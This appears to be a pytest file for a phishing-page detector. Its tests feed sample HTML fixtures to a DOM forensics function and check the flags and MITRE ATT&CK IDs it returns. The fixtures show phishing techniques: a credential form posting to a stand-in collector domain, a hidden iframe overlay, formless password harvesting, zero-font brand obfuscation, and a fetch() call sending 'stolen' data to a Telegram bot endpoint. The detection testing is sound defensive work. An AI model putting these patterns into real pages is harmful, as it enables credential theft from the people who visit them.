import pytest
from app.dom_comparator import extract_dom_deep_forensics

def test_dom_forensics_form_action_mismatch():
    html = """
    <html>
    <body>
        <form action="http://c2-collector-drop.xyz/login.php" method="POST" id="phish_form">
            <input type="email" name="user" />
            <input type="password" name="passwd" />
            <button type="submit">Sign In</button>
        </form>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://paypal-verification-account.tk/login",
        canonical_domains=["paypal.com"]
    )
    assert res.has_form_action_mismatch is True
    assert len(res.form_actions) == 1
    assert res.form_actions[0].target_domain == "c2-collector-drop.xyz"
    assert res.form_actions[0].has_password_field is True
    assert "T1056.001" in res.mitre_attack_id

def test_dom_forensics_canonical_form():
    html = """
    <html>
    <body>
        <form action="https://www.paypal.com/signin/submit" method="POST">
            <input type="password" name="password" />
        </form>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="https://www.paypal.com/signin",
        canonical_domains=["paypal.com", "www.paypal.com"]
    )
    assert res.has_form_action_mismatch is False

def test_dom_forensics_iframe_overlay():
    html = """
    <html>
    <body>
        <iframe src="http://hidden-overlay.tk" style="position: absolute; opacity: 0; z-index: 999;"></iframe>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://suspicious-overlay.tk"
    )
    assert res.has_iframe_overlay is True
    assert "T1204.001" in res.mitre_attack_id

def test_dom_forensics_suspicious_script():
    html = """
    <html>
    <head>
        <script src="http://evil-tracker-payload.tk/hook.js"></script>
    </head>
    <body>
        <h1>Login</h1>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://normal-landing.com",
        canonical_domains=["normal-landing.com"]
    )
    assert len(res.suspicious_external_scripts) >= 1


def test_dom_forensics_formless_harvesting():
    html = """
    <html>
    <body>
        <div class="custom-card">
            <h2>Enter Your Security Password</h2>
            <input type="text" id="user" placeholder="Email" />
            <input type="password" id="pass" placeholder="Password" />
            <button id="submit-btn" onclick="sendData()">Sign In</button>
        </div>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://formless-collector.xyz"
    )
    assert res.is_formless_harvesting is True
    assert res.password_input_count >= 1
    assert "T1056.004" in res.mitre_attack_id

def test_dom_forensics_zero_font_obfuscation():
    html = """
    <html>
    <body>
        <h1>G<span style="font-size: 0px;">decoyspam</span>o<span style="font-size: 0.1px;">123</span>o<span style="display:none;">xyz</span>g<span style="visibility:hidden">abc</span>le Sign In</h1>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://zero-font-attack.tk"
    )
    assert res.has_zero_font_obfuscation is True
    assert "T1027.006" in res.mitre_attack_id

def test_dom_forensics_webhook_exfiltration():
    html = """
    <html>
    <body>
        <script>
            function submitForm() {
                fetch("https://api.telegram.org/bot123456789:ABCdefGHI/sendMessage?chat_id=999&text=stolen", {method: "POST"});
            }
        </script>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://telegram-drop.tk"
    )
    assert len(res.exfiltration_endpoints) >= 1
    assert "T1020" in res.mitre_attack_id

def test_dom_forensics_shadow_dom_detection():
    html = """
    <html>
    <body>
        <login-card-component>
            <div data-shadow-root="true">
                <input type="password" name="encapsulated_pass" />
            </div>
        </login-card-component>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://shadow-dom-target.tk"
    )
    assert res.has_shadow_dom_nodes is True
    assert "T1027" in res.mitre_attack_id

